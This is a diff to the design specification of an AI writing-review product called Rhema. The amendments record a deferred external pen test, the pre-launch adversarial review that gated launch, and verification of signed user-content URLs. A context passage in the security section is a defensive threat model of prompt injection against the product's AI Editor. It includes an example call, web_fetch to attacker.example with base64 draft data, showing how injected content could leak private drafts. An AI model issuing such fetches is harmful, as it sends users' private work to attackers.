@@ -1,6 +1,6 @@
 # Rhema — Product, UI/UX, and Technical Systems Design Specification
 
-- **Status:** v1.0 — canonical · 2026-09-01 · Q-21…Q-26 **ratified by the operator** (the §16.3 #25–30 recommendations are now decisions; rulings R19–R26 in Appendix B.2 are final) · the v0.3 delta review (`docs/design/19`) is applied in full (Appendix E.5) · amended 2026-09-02 (AWS→GCP + direct Anthropic API — §12 banner), 2026-09-16 (REQ-BETA-19: open self-serve signup + self-serve credit purchase — see the §17 banner and the Appendix A.13 note), and 2026-09-17 (production domain is `rhema.tools` — one zone; `rhema.app`/`rhemausercontent.com` superseded; user-content origin → `usercontent.rhema.tools`, cookie isolation → host-only `__Host-` cookies — see the §13.3 banner; same date: prod database engine → **Cloud SQL for PostgreSQL** for the ~$50/mo prod budget — AlloyDB stays on dev/previews — see the §13.1 + §13.3 banners and ADR-010), and 2026-09-30 (round 3, launch readiness: **REQ-SPEC-29…32 added** — user-journey acceptance, tenant isolation in depth, research integrity, cost truthfulness; **REQ-SPEC-8, REQ-IDE-13, REQ-SPEC-1, REQ-GROWTH-1 amended** — interim trial terms, tier choice on the sheet, gate labels from the defaults table, the 20 s import as an SLO — see the Appendix A.9 note and ADR-013…017), and 2026-10-04 (reconciliation fold-back, REC.2 — the 2026-09-15 **G2 deferral** and the 2026-09-23 **early G3 read** recorded as §17 banners + the Appendix A.13 addendum; ADR-104/ADR-105), and 2026-10-10 (round-4 reconciliation fold-back, SPAREC.2 — **supersession pointers only**: the §12 `web` row's "React Router framework-mode SSR … hydrate" and §13.1's "**Web:** React Router framework mode (SSR)" + "**Editor:** Tiptap" descriptions are superseded in practice by the landed Hono SSR + islands + Vite/TanStack SPA — `docs/frontend-spa-spec.md` **v1.1** is the canonical renderer contract; ADR-106/107/108; see the §12-table + §13.1 banners), and 2026-10-17 (round-5 reconciliation fold-back, R5REC.2 — the **settled client-navigation mechanism** recorded: intra-app clicks route through one delegated bubble-phase `click` listener on `document` (the `nav-intercept.ts` ordered guard pipeline + skip-list; `SsrHandoff` replace-mode; the settle contract extended with `data-nav-count` + mounted-pending `data-mounted`) — `docs/frontend-spa-spec.md` **v1.2** §14.18/§14.19; ADR-110; see the §12-table + §13.1 banner addenda), and 2026-10-21 (R6UCD.1 / ADR-113 — user-content delivery is **API-minted GCS V4 signed GETs** on `storage.googleapis.com`; the edge-signed CDN contract is retired-in-place, its infrastructure inert — see the §13.3 banner) · next step: ticket decomposition per `docs/6_ticket-decomposition-prompt.md` (ledger row O6).
+- **Status:** v1.0 — canonical · 2026-09-01 · Q-21…Q-26 **ratified by the operator** (the §16.3 #25–30 recommendations are now decisions; rulings R19–R26 in Appendix B.2 are final) · the v0.3 delta review (`docs/design/19`) is applied in full (Appendix E.5) · amended 2026-09-02 (AWS→GCP + direct Anthropic API — §12 banner), 2026-09-16 (REQ-BETA-19: open self-serve signup + self-serve credit purchase — see the §17 banner and the Appendix A.13 note), and 2026-09-17 (production domain is `rhema.tools` — one zone; `rhema.app`/`rhemausercontent.com` superseded; user-content origin → `usercontent.rhema.tools`, cookie isolation → host-only `__Host-` cookies — see the §13.3 banner; same date: prod database engine → **Cloud SQL for PostgreSQL** for the ~$50/mo prod budget — AlloyDB stays on dev/previews — see the §13.1 + §13.3 banners and ADR-010), and 2026-09-30 (round 3, launch readiness: **REQ-SPEC-29…32 added** — user-journey acceptance, tenant isolation in depth, research integrity, cost truthfulness; **REQ-SPEC-8, REQ-IDE-13, REQ-SPEC-1, REQ-GROWTH-1 amended** — interim trial terms, tier choice on the sheet, gate labels from the defaults table, the 20 s import as an SLO — see the Appendix A.9 note and ADR-013…017), and 2026-10-04 (reconciliation fold-back, REC.2 — the 2026-09-15 **G2 deferral** and the 2026-09-23 **early G3 read** recorded as §17 banners + the Appendix A.13 addendum; ADR-104/ADR-105), and 2026-10-10 (round-4 reconciliation fold-back, SPAREC.2 — **supersession pointers only**: the §12 `web` row's "React Router framework-mode SSR … hydrate" and §13.1's "**Web:** React Router framework mode (SSR)" + "**Editor:** Tiptap" descriptions are superseded in practice by the landed Hono SSR + islands + Vite/TanStack SPA — `docs/frontend-spa-spec.md` **v1.1** is the canonical renderer contract; ADR-106/107/108; see the §12-table + §13.1 banners), and 2026-10-17 (round-5 reconciliation fold-back, R5REC.2 — the **settled client-navigation mechanism** recorded: intra-app clicks route through one delegated bubble-phase `click` listener on `document` (the `nav-intercept.ts` ordered guard pipeline + skip-list; `SsrHandoff` replace-mode; the settle contract extended with `data-nav-count` + mounted-pending `data-mounted`) — `docs/frontend-spa-spec.md` **v1.2** §14.18/§14.19; ADR-110; see the §12-table + §13.1 banner addenda), and 2026-10-21 (R6UCD.1 / ADR-113 — user-content delivery is **API-minted GCS V4 signed GETs** on `storage.googleapis.com`; the edge-signed CDN contract is retired-in-place, its infrastructure inert — see the §13.3 banner), and 2026-10-20 (round-6 launch posture — **ADR-111**: the public launch is decoupled from G2 and the §17 Phase-1 exit criteria are amended; **ADR-112**: the external pen test moves to a dated post-launch obligation and an in-round adversarial security review gates the launch instead — see the §17 + §12.8 banners), and 2026-11-11 (round-6 reconciliation fold-back, 205_R6REC.2 / REQ-TAIL-3 — the ADR-111/112/113 banners verified against the built + launched product; the §17 launch-evidence fold-check, the §16.4 launch-posture note, and the Appendix A.13 addendum appended; BL-05's G2/G3/H3 + ADR-lineage fold confirmed) · next step: ticket decomposition per `docs/6_ticket-decomposition-prompt.md` (ledger row O6).
 - **v0.2 → v0.3 delta, one paragraph:** Targeted amendments plus two new units, nothing else moved. (1) **RevisionObligation** becomes a first-class MVP object (§11.7; REQ-OBJ-1…8): blocking/major findings spawn durable debts closed only by a verified move, an argued rebut/defer, or mooting — making REQ-WF-7's carried/closed/new and §6.8's stall detection computed facts (now working for hand-run rounds) and folding `BacklogItem` in; the `ClaimVerdict` vocabulary is frozen, and claims gain `sources[]` stance edges and a `kind` (REQ-OBJ-17…19); a workspace preference profile is staged capture-now/learn-later behind a three-layer Editor firewall (REQ-OBJ-9…14). (2) A new **§18 Evaluation program** (REQ-EVAL-1…20): commissioned gold corpus, steelmanned best-of-two frontier baseline, human-adjudicated scoring, a numeric lift criterion with pre-committed go/no-go consequences. (3) The **authorship-legibility MVP slice** (AI-use statement, block-level provenance appendix and Authorship overlay, write-only span capture) moves from 1.x to MVP (§3.2 row 39; REQ-POS-6…10; ≈1.25–2 PM). (4) **Positioning:** §1.1 gains the category thesis, new §1.6 the competitive-moat statement, §15.1 review-first hero copy; Draft is demoted in narrative only, never in product (REQ-POS-5). (5) **§17** is restructured around a validation-first sequence — Phase 0 → benchmark → Review beta → full IDE → public launch — with its decision rule recorded (Q-22, since ratified). New requirement families `OBJ` / `EVAL` / `POS` / `BETA` are indexed in Appendix A.10–A.13; round-2 rulings R19–R26 in Appendix B.2.
 - **Synthesized from:** `docs/design/2..9` (eight design documents, ~90k words) and, where they defer, `docs/research/2..12` (eleven research notes); binding inputs are the founding prompt (`docs/1_founding-prompt.md`) and the operator decisions register (`docs/2_research-and-design-ledger.md` §Q, Q-1…Q-20).
 - **Supersedes:** every design document for any point on which they disagree. Where this spec and a design document differ, this spec is correct and the difference is recorded in §16 or Appendix B.
@@ -2513,6 +2513,22 @@ The conventions' 21 normative rules become runtime mechanisms; the skills' attes
 
 > **Amended 2026-09-30 (REQ-SPEC-31, ADR-015):** research-bearing runs preflight their server web tools before any debit; a Review with zero successful fetches delivers *Unverified* with its research phases refunded. Path B (ADR-006) is unchanged for partial gaps. See the Appendix A.9 note.
 
+> **⚑ Amendment — 2026-10-20 (ADR-112; operator ruling `GD-PEN.R6b`, superseding `GD-PEN.R6`):
+> the external pen test is a dated post-launch obligation; the launch gated on an in-round
+> adversarial security review instead.** P1.22's "the engagement is launch-blocking on criticals"
+> rule is amended: the external engagement must complete **≤ 60 days after launch**
+> (`D-P1.22-3` — launch + 60 d ≈ 2026-12-28; owner: the operator — procurement), with
+> criticals/highs hotfixed under the standard triage runbook. In its place the round-6 pre-launch
+> adversarial review (REQ-SEC-3) gated `GATE-LAUNCH` at **zero open criticals/highs** — the code
+> read against the controls list in `docs/security/pen-test-scope.md` plus live probes on the
+> deployed tip under `is_test` tenants: 178 live tenancy/authz legs executed, the CRITICAL
+> `F-R6SECR.1-1` found + fixed + deployed before launch, HSTS finding `F-R6SECR.1-2` likewise.
+> **Honesty clause:** the review is *not independent* — it is the same model family that wrote
+> the code; launch copy and the security posture page make no third-party-testing claim until the
+> external engagement reports. A confirmed cross-tenant read on prod is a breach under
+> `GD-EXPOSURE.R6` and expedites the engagement. The §12.8 controls' own live-exercise legs
+> (planted hostile fixtures on the deployed tip) carry as `D-R6SECR.1-1`.
+
 Rhema's Editor holds all three legs of the lethal trifecta — private drafts, untrusted web content, an outbound channel. The design narrows the third leg but, stated honestly, does not remove it (review 13 F16): the model talks only to the inference endpoint through the proxy, and the allowlisted write-back is the only way data reaches the user's project — but **search queries and fetch URLs are an outbound channel** through Anthropic's server tools (`web_search("<300 chars of the draft>")`, `web_fetch("https://attacker.example/?d=<base64>")`), and the user's own upload of a hostile draft is an input the Editor must read. Mitigations, stated accurately (REQ-ARCH-21 amended; REQ-SPEC-25):
 
 - **(a) Server tools are not summarizers.** Anthropic's `web_search` returns result content into context and `web_fetch` returns the page as a document block — full text, not a summary, and not wrapped by `fetcher`. The v1.0 text overstated this (review 13 F40). At **Full board, all Editor fetches route through the client-side `fetcher` tool** so untrusted-document wrapping and per-URL policy apply uniformly (the cost is latency, not capability); at Quick/Standard, server tools are used with the checks below.
@@ -2654,6 +2670,18 @@ Open-source-ready hygiene (Q-19): `packages/protocols` and `evals/` live in a **
 > is deployed but **inert** — nothing emits those URLs; removal is a separate cost/infra decision.
 > Cookieless holds by construction: the minted URL lands on `storage.googleapis.com`, outside
 > every `rhema.tools` cookie scope.
+>
+> **Checked as built — 2026-11-11 (205_R6REC.2 / REQ-TAIL-3):** the banner matches the shipped
+> code — `mintUserContentUrl` + `userContentKeyOwner` + `USERCONTENT_URL_TTL_SECONDS = 300` live in
+> `packages/contracts/src/upload.ts`; `GET /usercontent/sign` (`apps/api/src/usercontent-routes.ts`)
+> mints only for tenant-declaring `quarantine/<workspaceId>/` and `converted/<workspaceId>/` keys;
+> the row-owned `GET /voices/:id/samples/:itemId/raw` resolves under the session's RLS scope then
+> 302s to the mint (`apps/api/src/ingest-routes.ts`); `USERCONTENT_RENDERED_TYPES` is the single
+> allowlist and `apps/convert`'s `RENDERED_ALLOWLIST` re-derives from it; the two-tenant probe
+> asserts a foreign-key mint never reaches the signer (`integration/src/two-tenant-probe.ts`,
+> REQ-SPEC-30 invariant 13); `scripts/live/usercontent-cdn-verify.mjs` exercises the minted path
+> (unauth mint → 401, unsigned object GET → 403, signed GET → 2xx with the §13.3 headers,
+> tampered/expired → denied).
 - **Tenancy** (REQ-ARCH-25/26/27; REQ-DATA-4 amended — the RLS rules are in §11.4): `tenant_id` on every tenant-owned table; `FORCE ROW LEVEL SECURITY` with `SET LOCAL` only; GCS object prefixes per tenant with per-task service-account scoping; single region (us-central1) at MVP; no residency promise (Q-12).
 - **Backups and deletion** (REQ-ARCH-28): AlloyDB continuous backups (35 days) + GCS object versioning; project deletion = tombstone → 30-day purge → lifecycle delete; account deletion has a 14-day grace then hard-deletes content and PII, retaining anonymized ledger rows and the Stripe customer per tax law (REQ-ACCT-4).
 
@@ -3008,6 +3036,13 @@ Each departure honors the operator's intent and changes only the shape; each is 
 | **Users prefer flexible chat over the structured loop** (added v0.3) | Medium | the two-conduit design (§7.1) keeps chat present but never load-bearing; the drop-zone hero meets the chat habit at its entry point; the Review beta instruments the export-to-chat pattern and asks partners directly (REQ-BETA-10) before the demand-sensitive PM is spent |
 | **The best writers value human editorial relationships because they are human** (added v0.3) | Medium | positioned as the board a writer doesn't have, never a replacement for an editor they do; §18's A6 human-editor arm prices the comparison honestly ("what money currently buys", not a ceiling claim); design partners include working editors as calibration readers (REQ-BETA-16) |
 | **False-positive AI accusation against human-written work** (added v0.3 — reader-facing scanning is live on Substack; detector FPR claims are vendor-reported and historically unreliable — research/13 §A3) | Medium | provenance records as the writer's defense: AI-use statement + block-level appendix at MVP (row 39), "show your work" framing; never detection-evasion copy (REQ-POS-13) |
+| **Public product running without independent security testing** (added 2026-11-11, ADR-112) | Medium (time-boxed) | the in-round pre-launch adversarial review gated the launch at zero open criticals/highs (§12.8 banner); the external engagement is a dated obligation ≤ launch + 60 d (`D-P1.22-3`, ≈ 2026-12-28 — escalates to the operator if overdue); a confirmed cross-tenant read on prod is a `GD-EXPOSURE.R6` breach and expedites the engagement |
+
+> **⚑ Note — 2026-11-11 (205_R6REC.2 / REQ-TAIL-3):** under ADR-111 the public launch proceeded
+> without the wave-1 LIFT read — **this register's claims guard is unchanged.** No §16.4 / §1.4 /
+> §15.1 efficacy or superiority claim ships on any surface until a pre-registered wave meets
+> REQ-EVAL-15 (the REQ-EVAL-19 launch-surface lint still enforces it mechanically), and a later
+> wave failure applies REQ-EVAL-16's pre-committed consequences to a *public* product, not a beta.
 
 ---
 
@@ -3078,6 +3113,24 @@ No calendar dates (Q-2): sequence and exit criteria only. Every row of the featu
 > launch + 14 d; "benchmark wave 1 … is dispositioned" is satisfied by ADR-111's disposition. The
 > no-superiority-claim clause is unchanged. Operator decision — ledger § GATE DECISIONS ### Round 6
 > (`GD-LAUNCH-G2.R6`, `GD-S17.R6`); recorded in **ADR-111**.
+>
+> **⚑ Fold-check — 2026-11-11 (205_R6REC.2 / REQ-TAIL-3): the amended exit row verified against
+> the launch evidence.** `GATE-LAUNCH` SIGNED 2026-10-27 — 11/13 thresholds MET + 2 ruled
+> (`GD-THRESH1.R6`: operator verbatim "skip safari and mobile"; `GD-THRESH13.R6`: flip 1 parked ≥
+> 2026-12-01); the launch executed 2026-10-28T04:0xZ with flips 2–4 live-verified. **"Golden
+> validation green on all four protocols at the launch SHA" — met:** the minimal four-protocol
+> cohort ran green at the launch SHA inside `GD-GOLDEN-CAP.R6`'s ≤ $100 bound ($33.89 list,
+> `Promotion OK` after the `GD-GOLDEN-BAND.R6` re-calibration); the per-deploy re-run rule is
+> committed at `docs/ops/golden-rerun-rule.md`. **"First finding ≤ 4 minutes on the organic
+> cohort, read at launch + 14 d" — converted per its own contract:** the launch + 14.6 d read
+> found the organic cohort empty end-to-end, so the target stands as a `GD-WATCH.R6`
+> alert-backed watch (owner: operator · trigger: `slo.review.weekly` · re-read 2026-11-25;
+> `D-R5OPS.1-1`). **"Benchmark wave 1 … dispositioned" — satisfied by ADR-111:** G2/H2 continue
+> as the post-launch research program (BL-40/43/44/45 — owner: operator, trigger: program start;
+> re-homed at `204_R6REC.1` under `GD-ROADMAP.R6`). The no-superiority-claim clause is unchanged
+> and still lint-enforced (REQ-EVAL-19). All twelve §R6.3 deviations were signed at
+> `GATE-ACCEPT.R6` on 2026-11-11 (`GD-ACCEPT.R6`;
+> `docs/build/readouts/GATE-ACCEPT.R6.md`).
 
 **Engineering scope, honest estimate** (review 13 §10; senior engineers, agent-assisted implementation, the REQ-SPEC-19 editor cut and no working copy; person-months of engineering effort including verification and eval cost; calendar time not implied):
 
@@ -3093,7 +3146,7 @@ No calendar dates (Q-2): sequence and exit criteria only. Every row of the featu
 | Billing: Stripe flows, ledger + balances + holds, entitlement trial, estimator service, cap/hold/refund semantics, four usage levels, trial/abuse controls, circuit breaker | 4–5 | ledger correctness tests are most of it |
 | Export: pandoc/Typst container, CSL, docx/rtf/pdf/latex, account export/import golden | 2–3 | |
 | Landing, onboarding, Showcase, analytics, email | 2–3 | |
-| Security hardening and review: SSRF split, tenancy tests, usercontent origin, injection controls, external pen-test | 2–3 | |
+| Security hardening and review: SSRF split, tenancy tests, usercontent origin, injection controls, external pen-test **(ADR-112, 2026-10-20: the external pen-test moved to a post-launch ≤ launch+60 d obligation; the launch gated on the in-round adversarial review — §12.8 banner)** | 2–3 | |
 | Evaluation program (§18; added v0.3): corpus pipeline, enclave, extraction/matching tooling, wave runner + report | 2–3 | mostly reuse of the evals harness; the matching UI is the new build |
 | **Total** | **52–67 (v0.2 scope, excl. the evaluation row) · ≈ 57–74 with the v0.3 additions** | ≈ 6 engineers for 9–11 months, or 4 for 13–17; without the editor and working-copy cuts add 8–12. Arithmetic (design/19 F-3): the rows above incl. the evaluation row sum to 54–70; obligations (+1.5–2.5, engine/IDE work) and the authorship slice (+1.25–2, editor/export work) are carried as **additive line items** — the row values are unchanged v0.2 estimates and do *not* yet contain them; both fold into the affected rows at the Phase-0 re-estimate. 54–70 + 1.5–2.5 + 1.25–2 ≈ 57–74 — §16.3 #24 |
 
@@ -3770,6 +3823,17 @@ is weaker by construction; the $7–10/review cost finding vs the $20/mo WTP sto
 itself have been a pivot signal. The full-IDE ticket bodies (rows 29–50) unblocked. See the §17
 addendum banner and **ADR-105**; recorded in `docs/tickets/00_MANIFEST.md` § Spec amendments
 applied.
+
+**Addendum 2026-10-20 — REQ-BETA-19's launch-moment clause and REQ-BETA-20's sequence
+(ADR-111).** REQ-BETA-19's "the launch moment reserved for the full IDE" is superseded: the
+public launch of rhema.tools proceeded 2026-10-28 once `GATE-LAUNCH` passed (the full IDE had
+landed — rows 29–50 — and the round-4 SPA serves prod). REQ-BETA-20's "Phase-0 exit → §18 lift
+gate → … → public launch" ordering is amended where it bites: the §18 lift gate no longer stands
+before the launch — G2/H2 continue as the post-launch research program (BL-40/43/44/45; owner:
+operator). **Kept, verbatim:** no §16.4 efficacy/superiority claim on any surface until a
+pre-registered wave meets REQ-EVAL-15 — the REQ-EVAL-19 lint still enforces it — and
+REQ-EVAL-16's consequences apply retroactively if a later wave fails. See the §17 banners and
+**ADR-111**.
 
 ---
 
